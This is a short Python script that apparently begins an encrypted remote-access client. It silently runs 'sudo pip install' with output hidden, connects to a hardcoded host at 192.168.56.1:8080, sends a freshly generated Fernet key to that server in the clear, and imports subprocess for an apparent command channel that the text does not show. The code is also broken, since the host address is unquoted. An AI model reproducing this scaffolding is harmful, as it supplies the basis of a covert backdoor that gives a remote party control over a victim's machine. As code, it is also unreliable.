import os
import sys
import socket
import subprocess

#If cryptography isn't installed, install it.
try:
  from cryptography.fernet import Fernet
except:
  os.system("sudo -H pip install cryptography > /dev/null")
  from cryptography.fernet import Fernet
#HOST and PORT and SOCKET:
HOST=192.168.56.1
PORT=8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Generate key and create cipher_suite
key = Fernet.generate_key()
cipher_suite = Fernet(key)

#Encrypted send function
def sendenc(msg, sckt):
  cipher_text = cipher_suite.encrypt(msg)
  sckt.send(cipher_text)
def decrypt(msg):
  return cipher_suite.decrypt(msg)
#Send key to server
s.connect((HOST, PORT))
s.send(key)

